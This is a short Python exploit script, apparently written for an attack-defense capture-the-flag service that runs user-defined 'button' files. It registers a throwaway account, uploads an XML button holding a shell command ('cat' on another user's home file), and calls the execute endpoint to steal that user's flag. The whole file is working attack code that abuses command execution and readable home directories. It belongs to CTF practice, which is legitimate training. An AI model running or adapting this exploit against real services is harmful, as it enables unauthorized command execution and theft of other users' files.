
import secrets
import requests
import string

# the exploit must know where to find the service (ip, port) as well as the
# username of the flag holder and the name of the flag file
IP = "127.0.0.1"
PORT = 5000
USERNAME = "o090f2a"
FILE = "05cd2aac.button"

# first, we generate random user data to create a (probably) untaken account!
username = f"{secrets.choice(string.ascii_lowercase)}{secrets.token_hex(2+secrets.randbelow(5))}"
password = secrets.token_hex()

credentials = {
    'username': username,
    'password': password
}

# Then we use the credentials to generate an account
url = f"http://{IP}:{PORT}/register"
res = requests.post(url, data = credentials)

# then we create a session to operate from within our account
s = requests.Session()
res = s.post(f"http://{IP}:{PORT}/login", data = credentials)
res = s.get(f"http://{IP}:{PORT}/login", allow_redirects=False)
if res.status_code != 302:
    print("The service is down!")
    exit()

# by default, linux homes are readable by anyone. So a simple way to get the flag is just grab it.
script = f"cat /home/{USERNAME}/{FILE}"

# let's convert the script into a button file and upload it
content = f"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<command>\n<name>Generate Password</name>\n<script>{script}</script>\n</command>"
res = s.post(f"http://{IP}:{PORT}/add", data = {'filename':'exploit.button'})
res = s.post(f"http://{IP}:{PORT}/edit?button=/home/{username}/exploit.button", data = {'content':content})

# if we now execute the button, we get the flag
res = s.get(f"http://{IP}:{PORT}/execute?button=/home/{username}/exploit.button")
flag = res.text

print(flag)